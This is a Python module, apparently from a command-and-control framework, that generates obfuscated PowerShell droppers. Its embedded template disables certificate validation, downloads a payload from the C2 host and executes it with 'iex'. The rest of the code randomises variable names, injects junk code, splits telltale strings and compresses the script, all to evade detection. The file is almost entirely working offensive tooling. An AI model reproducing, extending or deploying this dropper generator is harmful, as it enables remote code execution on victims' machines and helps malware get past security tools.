"""
Dropper Generator with WebClient SSL Fix
Generates obfuscated PowerShell droppers using WebClient for SSL compatibility
"""

import socket
import random
import string

class DropperGenerator:
    def __init__(self, config_loader, logger):
        self.config_loader = config_loader
        self.logger = logger
        self.dropper_template = self._get_embedded_dropper_template()
    
    def _generate_random_name(self, prefix="", length=8):
        chars = string.ascii_letters + string.digits
        random_part = ''.join(random.choice(chars) for _ in range(length))
        return f"{prefix}{random_part}" if prefix else random_part
    
    def _compress_powershell_code(self, code):
        import re
        
        def replace_strings(match):
            return f"__STRING__{len(preserved_strings)}__"
            
        preserved_strings = []
        pattern = r'"[^"]*"'
        
        processed_code = re.sub(pattern, lambda m: (preserved_strings.append(m.group(0)) or f"__STRING__{len(preserved_strings)-1}__"), code)
        
        lines = processed_code.split('\n')
        compressed_lines = []
        
        for line in lines:
            if not line.strip():
                continue
                
            if '#' in line:
                line = line.split('#', 1)[0]
                
            line = line.strip()
            
            if line.startswith('$global:'):
                compressed_lines.append(line)
            else:
                compressed_lines.append(line)
        
        compressed_code = ';'.join(filter(None, compressed_lines))
        
        compressed_code = re.sub(r'\s*=\s*', '=', compressed_code)   
        compressed_code = re.sub(r'\s*{\s*', '{', compressed_code)  
        compressed_code = re.sub(r'\s*}\s*', '}', compressed_code)  
        compressed_code = re.sub(r'\s*;\s*', ';', compressed_code)  
        compressed_code = re.sub(r';\s*\$global:', ';$global:', compressed_code)  
        compressed_code = re.sub(r'\s+', ' ', compressed_code)     
        
        for i, string in enumerate(preserved_strings):
            compressed_code = compressed_code.replace(f"__STRING__{i}__", string)
        
        compressed_code = re.sub(r';\s*{', '{', compressed_code)
        
        compressed_code = re.sub(r'{;', '{', compressed_code)
        compressed_code = re.sub(r';}', '}', compressed_code)
            
        return compressed_code
    
    def _generate_obfuscation_map(self):
        variables_to_obfuscate = [
            'response', 'content', 'headers', 'webclient'
        ]
        functions_to_obfuscate = []
        obfuscation_map = {}
        for var in variables_to_obfuscate:
            obfuscation_map[var] = self._generate_random_name("v", random.randint(6, 12))
        for func in functions_to_obfuscate:
            obfuscation_map[func] = self._generate_random_name("f", random.randint(8, 15))
        return obfuscation_map
    
    def _get_embedded_dropper_template(self):
        template = '''[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[System.Net.ServicePointManager]::CheckCertificateRevocationList = $false
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$global:agentUrl = "{{AGENT_URL}}"
$global:deliveryUri = "{{DELIVERY_URI}}"
$global:agentHost = "{{AGENT_HOST}}"
$global:agentProt = "{{AGENT_PROTOCOL}}"
{{DROPPER_HEADERS}}
${{VAR_WEBCLIENT}} = New-Object System.Net.WebClient
foreach ($headerKey in ${{VAR_HEADERS}}.Keys) {
    ${{VAR_WEBCLIENT}}.Headers.Add($headerKey, ${{VAR_HEADERS}}[$headerKey])
}
$fullUri = "$($global:agentProt)://$($global:agentUrl)$($global:deliveryUri)"
${{VAR_CONTENT}} = ${{VAR_WEBCLIENT}}.DownloadString($fullUri).Trim()
${{VAR_WEBCLIENT}}.Dispose()
iex ${{VAR_CONTENT}}
'''
        return template
    
    def _apply_obfuscation(self, template, obfuscation_map):
        obfuscated_template = template
        for original, obfuscated in obfuscation_map.items():
            placeholder = f"{{{{VAR_{original.upper()}}}}}"
            obfuscated_template = obfuscated_template.replace(placeholder, obfuscated)
        return obfuscated_template
    
    def _add_junk_code(self, template):
        junk_variables = []
        num_junk = random.randint(3, 6)
        for i in range(num_junk):
            var_name = self._generate_random_name("j", random.randint(4, 8))
            var_value = random.choice([
                f'"{self._generate_random_name("", random.randint(8, 16))}"',
                str(random.randint(1000, 9999)),
                f'$env:{random.choice(["TEMP", "TMP", "USERNAME", "COMPUTERNAME", "PROCESSOR_ARCHITECTURE"])}'
            ])
            junk_variables.append(f"${var_name} = {var_value}")
        
        lines = template.split('\n')
        insert_index = 0
        
        for i, line in enumerate(lines):
            if line.startswith('$global:'):
                insert_index = i + 1
            elif line.strip() and not line.startswith('$global:') and not line.startswith('#') and insert_index > 0:
                break
        
        for junk in junk_variables:
            lines.insert(insert_index, junk)
            insert_index += 1
        
        return '\n'.join(lines)
    
    def _obfuscate_strings(self, template):
        obfuscated = template
        simple_strings = [
            ('DownloadString', f'{"Down" + "load" + "String"}'),
            ('Trim()', f'{"Tr" + "im"}()'),
            ('Headers', f'{"Head" + "ers"}'),
            ('WebClient', f'{"Web" + "Client"}'),
            ('Dispose', f'{"Dis" + "pose"}')
        ]
        
        for original, obfuscated_version in simple_strings:
            if random.choice([True, False]):
                obfuscated = obfuscated.replace(original, obfuscated_version)
        
        return obfuscated
    
    def _randomize_spacing_and_formatting(self, template):
        lines = template.split('\n')
        formatted_lines = []
        
        for line in lines:
            if line.strip():
                if not line.startswith('$global:') and not line.startswith('#'):
                    extra_spaces = ' ' * random.randint(0, 3)
                    line = extra_spaces + line.lstrip()
                
                if ' = ' in line and random.choice([True, False]):
                    line = line.replace(' = ', f' {"=" * random.randint(1, 1)} ')
            
            formatted_lines.append(line)
        
        return '\n'.join(formatted_lines)
    
    def generate_dropper(self, listener_config):
        """Generate an obfuscated PowerShell dropper for the given listener.

        listener_config must have:
          - bind_port (int)
          - protocol  (str)  e.g. 'http' / 'https'
          - upstream_host (str)  the C2 host agents connect to (also used as Host header)
          - profile   (dict) with 'http' sub-dict
        """
        try:
            main_host = listener_config.get('upstream_host') or 'localhost'
            profile = listener_config['profile']
            protocol = listener_config.get('protocol', 'http')
            port = listener_config.get('bind_port', 443 if protocol == 'https' else 80)

            http_config = profile.get('http', {})
            user_agent = http_config.get('user_agent', 'Mozilla/5.0')
            uris = http_config.get('uris', [])
            request_headers = http_config.get('request_headers', [])

            delivery_uri = uris[1] if len(uris) >= 2 else "/assets/css/main.css"

            external_host = listener_config.get('external_host') or main_host
            default_port = 443 if protocol == 'https' else 80
            agent_url = external_host if port == default_port else f"{external_host}:{port}"
            
            obfuscation_map = self._generate_obfuscation_map()
            
            print(f"\033[92m[+]\033[0m DROPPER OBFUSCATION - Generated mapping:")
            for original, obfuscated in obfuscation_map.items():
                print(f"\033[92m[+]\033[0m   {original} -> {obfuscated}")
            
            ps_headers = self._build_dropper_headers(request_headers, main_host, user_agent, obfuscation_map)
            
            configured_dropper = self.dropper_template
            configured_dropper = self._apply_obfuscation(configured_dropper, obfuscation_map)
            configured_dropper = configured_dropper.replace(
                '{{AGENT_URL}}', agent_url
            ).replace(
                '{{DELIVERY_URI}}', delivery_uri
            ).replace(
                '{{AGENT_PROTOCOL}}', protocol
            ).replace(
                '{{AGENT_HOST}}', main_host
            ).replace(
                '{{DROPPER_HEADERS}}', ps_headers
            )
            
            configured_dropper = self._add_junk_code(configured_dropper)
            configured_dropper = self._obfuscate_strings(configured_dropper)
            configured_dropper = self._randomize_spacing_and_formatting(configured_dropper)
            
            configured_dropper = self._compress_powershell_code(configured_dropper)
            
            original_size = len(self._randomize_spacing_and_formatting(self._obfuscate_strings(self._add_junk_code(
                self._apply_obfuscation(self.dropper_template.replace(
                    '{{AGENT_URL}}', agent_url
                ).replace(
                    '{{DELIVERY_URI}}', delivery_uri
                ).replace(
                    '{{AGENT_PROTOCOL}}', protocol
                ).replace(
                    '{{AGENT_HOST}}', main_host
                ).replace(
                    '{{DROPPER_HEADERS}}', ps_headers
                ), obfuscation_map)))))
            compressed_size = len(configured_dropper)
            reduction = ((original_size - compressed_size) / original_size) * 100
            
            print(f"\033[92m[+]\033[0m DROPPER COMPRESSION - Size: {compressed_size} bytes (reduced by {reduction:.2f}%)")
            
            self.logger.log_event(f"DROPPER GENERATOR - WebClient obfuscated dropper generated! ({len(obfuscation_map)} mappings, {compressed_size} bytes)")
            return configured_dropper
            
        except Exception as e:
            error_msg = f"Error generating obfuscated dropper: {e}"
            print(f"\033[91m[ERROR]\033[0m DROPPER GENERATOR - {error_msg}")
            self.logger.log_event(f"ERR DROPPER GENERATOR - {error_msg}")
            return None
    
    def _build_dropper_headers(self, request_headers, main_host, user_agent, obfuscation_map):
        try:
            headers_var = obfuscation_map.get('headers', 'headers')

            headers_dict = {
                "Host": main_host,
                "User-Agent": f'"{user_agent}"',
            }

            for header_line in request_headers:
                if ':' in header_line:
                    key, value = header_line.split(':', 1)
                    key = key.strip()
                    value = value.strip().strip('"')
                    if key.lower() not in ('host', 'user-agent'):
                        headers_dict[key] = f'"{value}"'

            if not any(k.lower() == 'accept' for k in headers_dict):
                headers_dict['Accept'] = '"*/*"'
            
            ps_headers = f'${headers_var} = @{{\n'
            max_key_length = max(len(key) for key in headers_dict.keys())
            
            for key, value in headers_dict.items():
                padding = ' ' * (max_key_length - len(key) + 1)
                if key == "Host":
                    ps_headers += f'    "{key}"{padding}= $global:agentHost\n'
                else:
                    ps_headers += f'    "{key}"{padding}= {value}\n'
            
            ps_headers += '}'
            return ps_headers
            
        except Exception as e:
            print(f"\033[91m[ERROR]\033[0m DROPPER GENERATOR - Error building obfuscated headers: {e}")
            headers_var = obfuscation_map.get('headers', 'headers')
            return f'''${headers_var} = @{{
    "Host"       = $global:agentHost
    "User-Agent" = "{user_agent}"
    "Accept"     = "*/*"
}}'''
    
    def get_dropper_stats(self):
        try:
            return {
                "template_embedded": True,
                "template_size": len(self.dropper_template),
                "template_source": "embedded_webclient_obfuscated",
                "type": "dropper",
                "ip_required": True,
                "version": "webclient_ssl_compatible",
                "ssl_features": [
                    "webclient_ssl_bypass",
                    "tls12_forced",
                    "certificate_validation_disabled"
                ],
                "obfuscation_features": [
                    "variable_name_randomization",
                    "junk_code_injection", 
                    "string_obfuscation",
                    "formatting_randomization",
                    "code_compression"
                ]
            }
        except Exception as e:
            print(f"\033[91m[ERROR]\033[0m DROPPER GENERATOR - Error getting statistics: {e}")
            return {"error": str(e)}